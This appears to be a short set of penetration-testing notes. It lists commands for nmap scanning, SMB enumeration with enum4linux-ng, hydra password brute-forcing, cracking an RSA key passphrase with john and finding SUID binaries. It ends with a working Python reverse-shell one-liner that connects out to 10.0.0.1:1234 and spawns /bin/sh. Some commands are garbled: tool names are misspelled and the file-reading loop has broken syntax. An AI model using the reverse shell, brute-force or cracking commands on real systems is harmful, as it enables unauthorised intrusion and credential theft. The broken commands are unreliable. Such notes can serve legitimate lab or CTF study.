to run an nmap scan 

nmap -sC -sV -oN /path/to/file ip


Use enum4linux-ng.py for enumerating smb clients and servers

use example

python3 enum4linux-ng.py -U -A -R ip

hydra example

hydra -l username -P /path/to/wordlist proto://ip

to crack the passphrase of an rsa key

run
sh2john.py rsa_file > file.txt
joh file.txt

to check for suid on a system run the following commands
find / -perm -u=s -type f 2>/dev/null

different ways to read a file

while read line; do echo $line done; < file
cat file
grep . file


We can get a reverse shell with the pentestmonkey reverse shell examples
in python it would be, note that if the machine doesnt have python2 installed(modern machines) it works with python3

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
